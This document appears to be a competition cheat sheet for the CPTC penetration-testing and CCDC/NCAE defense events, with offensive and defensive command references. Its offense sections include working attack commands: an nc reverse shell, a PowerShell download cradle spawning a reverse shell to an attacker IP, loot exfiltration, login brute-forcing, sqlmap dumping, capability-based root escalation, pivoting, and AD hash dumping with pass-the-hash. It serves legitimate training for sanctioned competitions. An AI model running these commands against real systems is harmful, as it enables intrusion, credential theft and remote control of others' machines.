# CDCC Command Dictionary

## Contents

**Part 1 — Offense**
- [Quick deploy (Linux toolkit)](#quick-deploy-linux-toolkit)
- [Ping & nmap](#ping--nmap)
- [Web: ffuf / nuclei / git-dumper](#web-ffuf--nuclei--git-dumper)
- [Burp Suite: proxy → Repeater](#burp-suite-proxy--repeater)
- [Login brute & sqlmap workflow](#login-brute--sqlmap-workflow)
- [Shells & file transfer](#shells--file-transfer)
- [Linux privesc (+ linpeas)](#linux-privesc--linpeas)
- [Pivoting (when you find extra subnets)](#pivoting-when-you-find-extra-subnets)
- [Password attacks (hydra / john / hashcat)](#password-attacks-hydra--john--hashcat)
- [FTP / SMB / quick hits](#ftp--smb--quick-hits)
- [Grep & universal search](#grep--universal-search)

**Part 2 — Windows & Active Directory (offense)**
- [Windows offense: got a shell, now what](#windows-offense-got-a-shell-now-what)
- [Windows & PowerShell (admin/defense)](#windows--powershell-admindefense)
- [Users & processes (Win)](#users--processes-win)
- [Active Directory](#active-directory)

**Part 3 — Defense**
- [File permissions & attributes](#file-permissions--attributes)
- [Find command patterns](#find-command-patterns)
- [SSH hardening](#ssh-hardening)
- [PAM (auth & passwords)](#pam-auth--passwords)
- [sysctl / kernel hardening](#sysctl--kernel-hardening)
- [sudoers](#sudoers)
- [Users & groups (Linux)](#users--groups-linux)
- [Web servers (nginx / apache) — defense](#web-servers-nginx--apache--defense)
- [Firewall (UFW / iptables)](#firewall-ufw--iptables)
- [Services & systemd](#services--systemd)
- [Networking & ports](#networking--ports)
- [Hidden data & stego](#hidden-data--stego)
- [Log analysis](#log-analysis)
- [Packages & disk cleanup](#packages--disk-cleanup)
- [GRUB & lockdown](#grub--lockdown)
- [Cron & scheduled tasks](#cron--scheduled-tasks)
- [Bash persistence checks](#bash-persistence-checks)
- [Docker](#docker)
- [MikroTik router (NCAE)](#mikrotik-router-ncae)
- [Netplan / IP config](#netplan--ip-config)
- [Vim quick keys](#vim-quick-keys)
- [Distro notes (Gentoo / Alpine / RedHat)](#distro-notes-gentoo--alpine--redhat)
- [Service config file reference](#service-config-file-reference)

---

# PART 1 — OFFENSE (CPTC)

## Quick deploy (Linux toolkit)

CPTC pre-stage rule: scripts go in the CPTC-provided public repo (request ≥2wks
before a CPTC event). Printed cheat sheets ARE allowed as on-site reference. The
personal toolkit repo lives separately and gets deployed/retyped on day one:

```bash
./setup.sh && exec zsh        # installs core pkgs + aliases, then reload shell
nq 127.0.0.1                  # sanity: alias works
lpe                           # sanity: linpeas works
```
Aliases: `nq` quick nmap, `nf` full sweep, `ffu` ffuf, `nuc` nuclei, `serve` http8000,
`lpe` linpeas, `pc` proxychains quiet, `ll`.

## Scanning truth: decoy port-walls & verifying ports

Some targets (THM-style boxes, real networks) run decoy tools (`portspoof` et al.)
that SYN-ACK **every** port — so `nmap -p-` reports ~65k "open". That wall of opens
is itself a fingerprint.

- Trust only handshake- or payload-level proof:
```bash
for p in 21 22 25 53 80 443 445 1433 3306 3389 5985 6379 8080 8443 9000 1337; do
  (timeout 2 bash -c "echo -n '' >/dev/tcp/[ip]/$p" 2>/dev/null && echo "OPEN  -> $p") || echo "closed   $p"
done
```
  (bash `/dev/tcp` does a REAL 3-way handshake — can't false-positive.)
- Then fingerprint ONLY the true ones: `nmap -sV -sC -p <real ports> [ip]`
- The connecting host can lie too (WSL2 NAT myths); fix: `.wslconfig` → `networkingMode=mirrored`.
- Note: `nmap` as root defaults to `-sS` (SYN scan) unless you force `-sT`.

## Recon baseline

```bash
ping -c 1 [ip]                # connect + one packet (scriptable)
ping -W 1 [ip]                # 1s timeout — fast sweeps
ping -n [ip]                  # no DNS, faster + quieter
ping -i 0.2 [ip]              # sub-0.2 interval needs root
```

**Nmap — always two phases, always save output:**
```bash
sudo nmap -p- -T4 -v --open [IP]
sudo nmap -sV -sC -p [port,port,etc] -Pn [IP]
```
- `-Pn` almost always on comp targets (they drop ping).
- `-oA` writes `.nmap/.gnmap/.xml` — the `.nmap` file feeds your report AND feeds phase 2 port list.
- Anonymous FTP shows up as response code `230` in the scan.
- NSE `vuln` is noisy — `nuclei` covers the same ground better for web.

## Web: ffuf / nuclei / git-dumper

**Fingerprinting** — pin the exact stack so you can match CVEs to it (confirmed-affected-versions only):
```bash
curl -I http://[ip]            # Server header = the banner itself
whatweb http://[ip]            # IDs server + CMS/framework/plugins — the go-to fingerprinter
nuclei -u http://[ip] -tags cve,tech        # auto-match against CVE templates
searchsploit "[service]" "[version]"     # local Exploit-DB mirror, no internet needed
```
Then verify the affected-version range on cvedetails.com BEFORE committing —
banners lie by omission: CVE-2021-41773/42013 (Apache path traversal→RCE) hit
only **2.4.49/2.4.50**, so 2.4.41 waving that CVE at you is a deliberate rabbit hole.

**ffuf** (faster gobuster; `FUZZ` keyword goes anywhere: path, header, param, vhost):
```bash
# main dir bust — match codes + auto-calibrate (use this by default)
ffuf -u http://[ip]:[port]/FUZZ -w [wordlist] -mc 200,301,302,401,403 -ac

# add extensions when hunting files, not just dirs
ffuf -u http://[ip]:[port]/FUZZ -w [wordlist] -e .php,.txt,.html -mc 200,301,302,401,403 -ac

# recurse into found dirs — run after a flat pass, not first (explodes runtime)
ffuf -u http://[ip]:[port]/FUZZ -mc 200,301,302,401,403 -ac -recursion -recursion-depth 2

# parameter fuzz — find hidden GET params on a page that takes input
ffuf -u "http://[ip]:[port]/[page]?FUZZ=test" -w [params] -ac

# POST body / login field fuzz
ffuf -u http://[ip]:[port]/[endpoint] -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -w [wordlist] -ac

# vhost fuzz — different job entirely (finds virtual hosts, not paths)
ffuf -u http://[ip]:[port]/ -H "Host: FUZZ.[domain]" -w [subdomains] -fs [size]
```
- `-ac` filters the app's generic "not found" page. Flask/custom 404s return 200,
  which breaks normal filtering, so `-ac` is what keeps output clean.
- Bigger list when common.txt is thin:
  `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
- Extensions depend on the stack: PHP → `.php,.phtml` | Python (Gunicorn/Flask) → `none,.txt,.py` | Java (Tomcat) → `.jsp,.do` | .NET (IIS) → `.aspx,.ashx`
- Manual filter when `-ac` leaks: `-fs [size]` `-fw [word]` `-fc [code]`

**Nuclei** (template-driven vuln scanner, actively maintained, far less noise than NSE):
```bash
nuclei -update && nuclei -ut                         # update engine + templates
nuclei -u http://[ip]:[port]                          # full pass — tech, exposure, everything
nuclei -u http://[ip]:[port] -tags exposure,config    # isolate leaks (.git, backups, configs)
```
Default run already does tech-detection + exposure templates. Read *why* it flagged
something and verify by hand — don't just trust the match.

**git-dumper** (exposed `.git/` → rebuild source; beats dir-busting):
```bash
pipx install git-dumper                         # or: pip install git-dumper
git-dumper http://[ip]:[port]/.git/ ./src       # dump repo into ./src
cd src
git log --oneline                               # commit history
grep -ri "secret\|password\|api_key\|token" .   # sweep source for creds
```
Nmap flags exposed `.git/` as `http-git`; ffuf shows `.git/HEAD`, `.git/config`,
`.git/index` all returning 200.

Also: manual creds sweep of dumped/uploaded code: `cat * | grep -i passw*`,
and SQLi test string: `jim404' OR '1'='1`, PHP info probe: `<?php phpinfo(); ?>`.

## Burp Suite: proxy → Repeater

```bash
burpsuite       # WSLg pops the GUI; WSL-internal Firefox is the proxy client
                # (Windows Firefox can't reach WSL's 127.0.0.1 — use the WSL browser)
```
- HTTPS through proxy = "PortSwigger CA" MITM warning; HSTS blocks manual bypass.
  Fix: browse `http://burp` (magic URL) → save CA → Firefox cert manager (Authorities) →
  import + "trust to identify websites".
- Workflow: Intercept ON → act in browser → request caught → right-click **Send to
  Repeater** → Intercept off → craft payloads in Repeater, Send each, read raw response.
- In Repeater: keep `Origin`/`Referer` (drop them and "working" apps mysteriously fail);
  craft minimal requests by deleting extra headers; toggle **Update Content-Length**.
- Interactive keys: `s` status · `p` pause · `b` bypass (skips queue chunk!) ·
  `c` checkpoint · `f` finish · `q` quit — never `b` on a run that finishes in 30s.

## Login brute & sqlmap workflow

- Manual payload ladder FIRST (7-ish variants). **All-identical responses ≠ no SQLi** —
  it may be *blind*; sqlmap time-based finds what the eye can't. Always pair:
  ```bash
  sqlmap -u "http://[ip]/login.php" --data="username=admin&password=zzz" --batch --level=2 --risk=1
  ```
- Oracle text: the app's exact fail message. hydra `F=` must match word-for-word;
  ffuf `-fr "Login failed"` filters it so hits glow.
- Speed ladder for the brute (hydra ≈2k/min; ffuf ≈10–30k/min):
  ```bash
  ffuf -u http://[ip]/login.php -X POST -d 'username=admin&password=FUZZ' \
      -w [wordlist] -fr "Login failed" -t 40 -c
  hydra -l admin -P [wordlist] -t 16 -f [ip] \
      http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed..."
  ```
  `-l` = ONE user, `-L` = list. Users × passwords multiplies forever (7 × 14.3M = 100M
  tries = weeks). Tier up: top10k → 1M → rockyou × rules (best66.rule on hashcat ≥7;
  `ls` the rules dir first — names shift).
- sqlmap sniper commands (time-based blind is ~1 second per character — patience is normal):
  ```bash
  sqlmap ... -p username --dbms=MySQL --batch -D users --tables   # ONE db, not --tables world
  sqlmap ... -D users -T users --dump                            # rows land + hash-crack prompt (say Y)
  ```
- Hash length = format detector: 32 hex = MD5 (`-m 0`), 40 = SHA1, 64 = SHA256, `$2y$` = bcrypt.
- Themed credentials are real: user named after the theme? Try themed wordlists +
  digit masks (`-a 6 '?d?d?d?d'`).
- Negative findings ARE findings. Report sentences: "login.php resistant to 7
  tautology/comment payloads (no visible SQLi) but time-based blind confirmed via sqlmap,"
  "MD5 hash resisted ~1B wordlist+rule candidates."
- `required` on HTML inputs = client-side only. curl/Burp ignore it freely.

## Shells & file transfer

**Catching + upgrading shells:**
```bash
rlwrap nc -lvnp 443                              # listener w/ arrow keys + history (use rlwrap always)
python3 -c 'import pty;pty.spawn("/bin/bash")'   # dumb shell -> real TTY
# inside the TTY: Ctrl-Z, then: stty raw -echo; fg    # full keyboard
```
**Reverse shell (classic nc frag trick):**
```bash
mkfifo /tmp/f; nc [kali-ip] 443 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
```
**File transfer — serve from Kali (`serve` alias = `python3 -m http.server 8000`):**
```bash
# Linux victim
wget http://[kali-ip]:8000/linpeas.sh
curl -O http://[kali-ip]:8000/tool.tar.gz
# Windows victim
certutil -urlcache -f http://[kali-ip]:8000/nc.exe nc.exe            # from cmd
IWR -UseBasicParsing http://[kali-ip]:8000/tool.exe -OutFile tool.exe  # from PS
# Pull results BACK to Kali (for the report): run http.server on the victim and
# wget from Kali, or compress+base64 through your reverse channel:
tar czf loot.tgz ./dir; base64 loot.tgz > loot.b64  # then copy out via clipboard/nc
```

## Linux privesc (+ linpeas)

**Manual order (80% of boxes die here, do it before linpeas):**
```bash
sudo -l                                   # free money ~50% of the time -> GTFOBins
find / -perm -4000 -type f 2>/dev/null    # SUID binaries (also: find / -xdev -perm -4000)
getcap -r / 2>/dev/null                    # file capabilities — cap_setuid+ep = instant root
                                           # SEPARATE from SUID: a binary can carry caps w/o the 4000 bit
cat /etc/crontab && crontab -l            # scheduled root tasks
cat ~/.bash_history /home/*/.bash_history 2>/dev/null   # creds live here
id                                        # in 'docker' or 'lxd' group = basically won
grep -i "passw\|pwd\|creds" /var/www/* -r 2>/dev/null    # web apps leak creds
```
Any SUID binary, `NOPASSWD` sudo entry, or abusable capability → **GTFOBins** → instant root.
NOTE: make sure `bash` itself doesn't carry the SUID bit on the flip side.

**Capabilities (the SUID blind spot):** `getcap` output is `path = cap_name+flags`.
The full path on the LEFT is your target. Hunt for `cap_setuid` first (clean root),
then `cap_setgid`, `cap_dac_read_search` (read any file), `cap_sys_admin`.
```bash
getcap -r / 2>/dev/null                            # if getcap missing:
find / -type f 2>/dev/null | xargs getcap 2>/dev/null   # fallback sweep
# example hit: /usr/bin/python3.8 = cap_setuid+ep  -> GTFOBins "Capabilities" section:
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
THM/CPTC usual suspects: python, perl, `vim`/`view`, `node`, `gdb` sitting in a
non-standard path. `setuid(0)` works ONLY because the cap grants it — root = UID 0,
kernel checks the number not the name.

**linpeas — the automated sweep for everything you'd never spot:**
```bash
./linpeas.sh | less -R          # fast pass
./linpeas.sh -a | less -R       # aggressive: extra checks incl. sudo brute (slow, skip in comp)
./linpeas.sh > peas.out 2>/dev/null; less -R peas.out   # save it, cite it in report
```
- Only chase **red/yellow** highlight; it ranks PE potential %. linpeas flags caps too,
  but manual `getcap` is faster than waiting for the full run.
- Get it on the box:
  ```bash
  curl -sL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
  # target has no internet? serve from Kali:
  python3 -m http.server 8000   # then on target: wget http://[kali-ip]:8000/linpeas.sh
  ```
- **winpeas** = the Windows twin (transfer it the same way, run `.\winpeas.exe`).

## Pivoting (when you find extra subnets)

Scenario: you own box A ([pivot-ip]) and `ip a` shows it's ALSO on [hidden-subnet]/24 —
a subnet your Kali can't reach. That's a pivot. CPTC scoring loves reported
hidden subnets, so pivot BEFORE scanning deep.

**Recon from inside the victim first:**
```bash
ip a; ip route; cat /etc/hosts; cat /proc/net/tcp   # linux
ipconfig /all; route print; netstat -ano            # windows
```
**ligolo-ng (modern, no proxychains, best option):**
```bash
# Kali:
ligolo-proxy -selfcert
sudo ip tuntap add user $USER dev ligolo && sudo ip link set ligolo up
sudo ip route add [hidden-subnet]/24 dev ligolo         # the HIDDEN subnet
# Victim (linux): ./ligolo-agent -connect [kali-ip]:11601 -ignore-cert
# Victim (win):   .\agent.exe      -connect [kali-ip]:11601 -ignore-cert
```
Now nmap/ffuf/curl against the hidden subnet work normally from your Kali.
**chisel (fallback):**
```bash
# victim: ./chisel server -p 8000 --reverse   |   Kali: chisel client [victim-ip]:8000 R:socks
# then: nano /etc/proxychains4.conf  -> last line: socks5 127.0.0.1 1080
proxychains4 -q nmap -sT -sV -T4 --top-ports 200 [hidden-subnet]/24
```
**Proxy rules:** through socks = `-sT` only (never `-sS` SYN scans / UDP — silent failure).
**SSH tunnels (if you have SSH creds on the victim):**
```bash
ssh -L 9999:[victim-ip]:80 user@[pivot-ip]    # single-service port fwd
ssh -D 1080 user@[pivot-ip]                  # full SOCKS -> use with proxychains
```
**socat linear relay:** `socat TCP-LISTEN:9000,fork TCP:[victim-ip]:445`

## Password attacks (hydra / john / hashcat)

**Hydra:**
```bash
sudo hydra -l [user] -P [wordlist] -t 10 -f -I ssh://[ip]
sudo hydra -L [users.txt] -p "[pass]" -t 16 -f [ip] http-post-form "/admin/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```
Web form: the `F=` text must match the site's real "bad login" message exactly.

**john (linux hashes):**
```bash
unshadow passwd.txt shadow.txt > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --show
```
**hashcat modes worth memorizing:**
| Mode | Hash |
|---|---|
| `-m 0` | MD5 |
| `-m 1000` | NTLM (windows local) |
| `-m 13100` | Kerberoast TGS |
| `-m 18200` | AS-REP roast |
| `hashcat -m [mode] out.txt /usr/share/wordlists/rockyou.txt` |

**The golden rule:** creds found anywhere → try them on EVERY other box (ssh,
winrm 5985, smb 445). Password reuse is the #1 cross-machine CPTC finding.

## FTP / SMB / quick hits

```bash
ftp [ip]                          # anon: user 'anonymous', blank pass (check Local: ftp 127.0.0.1)
smbclient -L //[ip] -N            # list shares (null session)
smbclient //[ip]/[share] -N       # connect to a share
```
**Post-access recon:** `id`, `lsof -i` — and check `who` for other live sessions.
**Redirection:** `cmd 2> errors.txt`, `cmd 2>&1 | grep text`, `curl -s [url]`.

## Grep & universal search

```bash
grep -r "word" .            # recursive dir search
grep -i "word" file         # case-insensitive
grep -w "Donald" file       # exact word only (McDonald won't match)
grep -A 4 "text" file       # match + 4 lines after
grep -B 4 "text" file       # match + 4 lines before
grep -C 4 "text" file       # match + 4 lines before and after
grep -l "text" *            # filenames only
grep -n "text" file         # line numbers
grep -Rin file_upload .     # find upload handlers (web)
grep -irln "text"           # recursive, case-insensitive, filenames only
```

---

# PART 2 — WINDOWS & ACTIVE DIRECTORY (OFFENSE-HEAVY)

## Windows offense: got a shell, now what

```powershell
whoami /all                                   # groups + priv flags
whoami /priv                                  # killer privs:
#   SeImpersonatePrivilege  -> PrintSpoofer / potato  -> SYSTEM
#   SeBackupPrivilege       -> NTDS.dit copy on DC -> secretsdump offline
net user ; net localgroup Administrators
qwinsta                                       # live sessions (docs/creds in memory)
netstat -ano                                  # internal ports -> next pivot targets
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run    # autoruns
schtasks /query /fo LIST 2>$null | findstr /i "TaskName Run"    # persistence check
cmdkey /list                                  # saved creds (use immediately)
Get-ChildItem C:\Users -Recurse -File -Include *.txt,*.pdf,*.xlsx 2>$null
type C:\Users\[user]\Desktop\*.txt
```
Reverse shell (no extra tools beyond powercat itself):
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://[kali-ip]:8000/powercat.ps1');powercat -c [kali-ip] -p 443 -e cmd
```
Tool transfer onto the box:
```powershell
certutil -urlcache -f http://[kali-ip]:8000/nc.exe nc.exe
IWR -UseBasicParsing http://[kali-ip]:8000/tool.exe -OutFile tool.exe
```
Gotchas: always `-Pn`; if you lock yourself out of a box tell Operations FIRST.

## Windows & PowerShell (admin/defense)

```powershell
netstat -ano                                 # ports + PIDs
Get-SmbShare                                 # all shares ($ = hidden share)
Get-SmbShareAccess -Name [share]             # access rights
(Get-ADDomain).NetBIOSName
Get-Content -Path .\file                     # cat a file
attrib +r C:\path\flag.txt                   # read-only
```
PowerShell basics:
```powershell
Write-Host "lol" ; Read-Host
Get-Command -CommandType cmdlet ; Get-Help [cmd]
"lol" | Out-File lol.txt
$x = 5.5; $x.GetType() ; Get-Member -InputObject $x
$a = @('lolz','lelz'); $a[0]
$h = @{"Wizard"="Gandalf"} ; $h.Add("Dwarf","Gimli") ; $h.Remove("Dwarf")
```
Consoles: `dsa.msc` (AD), `sysdm.msc`, `dnsmgmt.msc` (DNS).

## Users & processes (Win)

```powershell
Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine
# ^ full cmdline + parent PID: catches encoded payloads, cradles, service→webshell spawns

Get-LocalGroupMember Administrators          # high priv — check first
Get-LocalGroupMember Users ; Get-LocalUser

Add-LocalGroupMember    -Group Administrators -Member [user]
Remove-LocalGroupMember -Group Administrators -Member [user]
Disable-LocalUser -Name [user]
Set-LocalUser -Name [user] -Password (Read-Host -AsSecureString)   # kills persisted creds

net user "User" /add | /delete | /active:yes|no
net localgroup Administrators "User" /add | /delete
```
Rogue admin removed? Reset their password too or they walk back in with a saved
cred. Verify the account isn't a scored service account first.

## Active Directory

**AD backups live in** `\Windows\NTDS\` and `\Windows\SYSVOL`.

```bash
nxc smb [subnet]/24                                   # SMB sweep
nxc smb [ip] -u [user] -p [pass] --sam                # dump (--lsa/--ntds/--dpapi)
nxc ldap [ip] -u [user] -p '' --kerberoasting out.txt
impacket-GetUserSPNs -request -dc-ip [ip] domain/user:pass
impacket-secretsdump domain/user:pass@[ip] -just-dc
hashcat -m 13100 output.txt rockyou.txt              # Kerberoast TGS
hashcat -m 18200 output.txt rockyou.txt              # AS-REP
evil-winrm -i [ip] -u Administrator -H [ntlm-hash]    # pass-the-hash
```
Domain users & groups:
```powershell
Get-ADGroupMember "Domain Admins"            # crown jewels
Get-ADGroupMember "Enterprise Admins"
Get-ADUser -Filter * -Properties whenCreated | Sort whenCreated   # baseline + diff later
Set-ADAccountPassword -Identity [user] -Reset -NewPassword (Read-Host -AsSecureString)
Disable-ADAccount -Identity [user]
Remove-ADGroupMember "Domain Admins" -Members [user]
# Find what red team will roast BEFORE they do (defense angle):
Get-ADUser -Filter {ServicePrincipalName -like "*"}
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```
User admin: `net user u p /add /domain`, `New-ADUser`.
impacket is king for dumps. `sssd.service` joins Linux boxes to AD. Unique bind
accounts per service. On a defended DC, rotating passwords is the strongest move
(kills every dumped hash), sparing scored service accounts.

---

# PART 3 — DEFENSE (CCDC / NCAE)

## File permissions & attributes

```bash
chmod 600 file              # owner read/write only
chmod 640 -R /root          # lock down all of /root (stops privesc)
chmod 600 /etc/passwd /etc/shadow   # not world-writable
chattr +i file              # immutable: nobody modifies
chattr -i file ; lsattr file
find . | xargs -I f lsattr -a f 2>/dev/null | grep '^....i'
```
**ACLs:**
```bash
getfacl file ; setfacl -m g:testsubjects:--- /home/glados/ ; setfacl -x g:testsubjects /home/glados/
```

## SSH hardening

`/etc/ssh/sshd_config`: `PermitRootLogin no`, `PermitEmptyPasswords no`.
```bash
chown root /etc/ssh/sshd_config ; chgrp root /etc/ssh/sshd_config
ssh-keygen -f key -N ''           # keypair, no passphrase
cp /root/id_rsa.pub /home/user/.ssh/authorized_keys
ufw allow 'OpenSSH'
```
Watch X11 forwarding; keys ⇒ disable password; `DenyGroups` blocks groups.

## PAM (auth & passwords)

PAM: `/etc/pam.d/`, modules in `/lib/x86_64-linux-gnu/security/`.
**Backdoor check:** `pam_permit.so` in `common-auth` = auth bypass — swap to `pam_deny.so`.
Swap detection: `md5sum / sha256sum` of `pam_permit.so` vs `pam_deny.so` — same hash = swapped.
```bash
pam-auth-update --package --force
apt-get -y --reinstall install libpam-runtime libpam-modules
```
Lockout (`common-auth`): `pam_faillock.so preauth|authfail|authsucc` lines.
History (`common-password`): `password required pam_unix.so remember=1000`
Quality: `pam_pwquality.so retry=3 minlen=12 ucredit=-1 lcredit=-1 ocredit=-1 dcredit=-1`
`pwquality.conf`: difok=5 minlen=10 (all four credit groups) dictcheck=1 usercheck=1 minclass=4 maxrepeat=3 maxclassrepeat=4

## sysctl / kernel hardening

`/etc/sysctl.conf` + `/etc/sysctl.d/10-kernel-hardening.conf`; apply `sysctl -p`:
```
net.ipv4.tcp_syncookies = 1     # SYN flood
kernel.randomize_va_space = 2   # ASLR
kernel.sysrq = 0
kernel.kptr_restrict = 2
```

## sudoers

`/etc/sudoers` — remove `Defaults !authenticate` (sudo without password).

## Users & groups (Linux)

```bash
id -u user ; userdel -r user ; adduser user
```
UIDs: root=0, services <1000, users >999. System accounts: `!`/`*`/`*!` in `/etc/shadow`,
`nologin`/`false` shells in `/etc/passwd`. Aging in `/etc/login.defs`:
`PASS_MAX_DAYS 30`, `PASS_MIN_DAYS 0-10`, `PASS_WARN_AGE 14`.

## Web servers (nginx / apache) — defense

nginx: `/etc/nginx/nginx.conf`, sites at `/etc/nginx/sites-available/default` — `server_tokens off;`,
webroot `chown www-data:www-data /var/www/html`.
apache: `ServerTokens Prod` + `ServerSignature Off` in `conf-enabled/security.conf`.
```bash
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt \
  -subj "/CN=localhost/O=Acme/OU=IT Department/L=Geneva/ST=Geneva/C=CH"
openssl x509 -in /etc/nginx/ssl/nginx.crt -text -noout | head
```
Manage: `systemctl status|restart|stop nginx`, firewall 80/443.

## Firewall (UFW / iptables)

```bash
sudo ufw enable ; sudo ufw app list ; sudo ufw allow 'AppName' ; sudo ufw delete allow 'AppName'
sudo ufw allow from [web-ip] to any port 3306
rc-update add iptables default    # gentoo/alpine
```

## Services & systemd

```bash
systemctl status ssh ; service ssh status
systemctl list-unit-files        # ALL services, incl. dead ones
systemctl list-units -t service --state=running
systemctl list-timers --all
```
Malicious units/timers hide in `/etc/systemd/system/` and `/usr/lib/systemd/system/`.
`cat` before removing; stop → disable → delete.

## Networking & ports

```bash
netstat -tulpn ; ss -plunt ; lsof -i ; lsof -i :80 ; ps [pid] ; netstat -ano (Win)
```
Pivot recon on a victim: `ip a; ip route; cat /etc/hosts` (see Pivoting, Part 1).
`/etc/hosts` — check for injected entries.

## Hidden data & stego

```bash
file meme.jpg                  # is that jpeg really a jpeg? (caught zip/png/pdf masquerading)
exiftool meme.jpg              # metadata: GPS, comments, software strings — read first
strings meme.jpg | head -50    # readable text inside a binary (docs, passwords)
binwalk meme.jpg               # the "picture viewer" — scans image for embedded files
binwalk -e meme.jpg            # EXTRACT the embedded payload (zips, rar, pngs, another fs)
binwalk --dd='.*' meme.jpg     # force-carve by signature when -e won't
zsteg meme.png                 # PNG/BMP LSB stego (jpgs don't LSB — for those use steghide)
steghide extract -sf meme.jpg  # classic jpg stego, try blank passphrase first
stegseek meme.jpg /usr/share/wordlists/rockyou.txt   # when steghide needs a password — crack it
getfattr -d secret.txt         # extended attrs (metadata after the file)
```
Order that works: `file` → `exiftool` → `strings` → `binwalk -e` → `zsteg`/`stegseek`.

## Log analysis

```bash
awk '{print $1}' access.log | sort | uniq -c
tail -f /var/log/auth.log &
```
Locations: `/var/log/auth.log`, `/var/log/secure/`, `/var/log/nginx/`, `/var/log/messages` (Alpine).

## Packages & disk cleanup

```bash
apt list --installed | grep -v automatic
sudo apt remove wireshark ; sudo dnf upgrade / -y install [pkg]
apt-get clean ; apt-get autoremove -y ; journalctl --vacuum-size=100M ; docker system prune -a
df -ah
```
Attacker tools to hunt: `john`, `wireshark`, `nikto`, `hydra`, `nmap`, `snort`, `ophcrack`.

## GRUB & lockdown

`cat /sys/kernel/security/lockdown`. Enforce in `/etc/default/grub`:
`GRUB_CMDLINE_LINUX_DEFAULT="quiet splash lockdown=integrity,confidentiality"` → `update-grub`.
`grub2-mkpasswd-pbkdf2` — check `/etc/grub.d/40_custom`.

## Cron & scheduled tasks

```bash
crontab -l                        # current user
# root: /etc/crontab + /etc/cron.* | user: /var/spool/cron/crontabs
```
Idea: scheduled restart of critical services if they die.

## Bash persistence checks

Check: `~/.bashrc`, `/etc/bash.bashrc`, `~/.profile`, `~/.bash_profile`, `~/.bash_logout`.
Also: `auditd` local events = yes; `limits.conf` `* hard nproc 2500` + `* hard core 0`;
`/etc/X11/xinit/xserverrc` `-nolisten`; gdm3 DisallowTCP=true; lightdm guest off;
`systemctl stop cups avahi`; AppArmor enabled.

## Docker

```bash
docker ps ; docker exec -it [name] /bin/sh ; docker restart [name] ; docker inspect [name] ; docker logs [name]
```
Configs under `/etc/docker`; exposed ports via `docker ps`.

## MikroTik router (NCAE)

```
/ip address print ; /interface print
/ip address add address=10.1.10.1/16 interface=[name]
/ip route print ; /ip service print ; /ip service disable [name|number]
```
Internal LAN `172.20.xx.1/16`, external `192.168.xx.1/24` (net1/ether6). Enable NAT +
bridging on internal; port-map web server `192.168.xx.2` to 80 TCP+UDP. Router UI
`172.20.xx.1:8080`, gateway `172.20.0.1`. `xx` = team number.

## Netplan / IP config

`/etc/netplan/01-network-manager-all.yaml` — spaces not tabs:
```yaml
renderer: NetworkManager
ethernets:
  ens18:
    addresses: [192.168.45.2/24]
    gateway4: 192.168.45.1        # no /24 here
```
`sudo netplan apply`; find adapter via `ip a`.

## Vim quick keys

`vi file` → `i` insert → `ESC` → `:wq`.

## Distro notes (Gentoo / Alpine / RedHat)

OpenRC: `rc-service [svc] start|restart`, `rc-update add [svc] default`.
Gentoo: `/etc/conf.d/net`, `/etc/portage/make.conf`, `/etc/init.d/`.
RedHat: `sudo dnf upgrade`, `dnf -y install`; sudo group = `wheel`.

## Service config file reference

| Service | Config | Harden | Manage | Port |
|---|---|---|---|---|
| SSH | `/etc/ssh/sshd_config` | root no, one auth kind | `systemctl status ssh` | 22 |
| Nginx | `/etc/nginx/nginx.conf`, `sites-available/default` | `server_tokens off;`, own webroot | `systemctl restart nginx` | 80/443 |
| Apache | `/etc/apache2/apache2.conf`, `000-default.conf` | ServerTokens Prod, Off signature | `systemctl restart apache2` | 80/443 |
| MySQL | `/etc/mysql/mysql.conf.d/mysqld.cnf` | `mysql_secure_installation` | `systemctl status mysql` | 3306 |
| PostgreSQL | `/etc/postgresql/[version]/main/postgresql.conf`, pg_hba.conf | limit pg_hba, scram-sha-256 | `systemctl status postgresql` | 5432 |
| Postfix | `/etc/postfix/main.cf` | no open relay (mynetworks 127/8), TLS | `systemctl restart postfix` | 587 |
| Dovecot | `/etc/dovecot/dovecot.conf` | IMAPS only | `systemctl restart dovecot` | 993 |
| Samba | `/etc/samba/smb.conf` | `hosts allow`, guest off | `systemctl restart smbd` | 445 |

```sql
show databases; use [db]; show tables; select * from [table];
ALTER USER '[user]'@'localhost' IDENTIFIED BY '[new-password]'; drop user [user]@localhost;
```
Postgres firewall: `ufw allow from [web-ip] to any port 5432`. MySQL data: `/var/lib/mysql`.
Mail: block 25/143 plaintext, use 587/993; postfix TLS `smtpd_tls_security_level = may|encrypt`.
Samba users: `smbpasswd -a [user]`.

## Extra one-liners worth keeping

```bash
cat /etc/os-release ; file ./* ; ln -s target linkname ; cat /proc/[pid]/environ
```
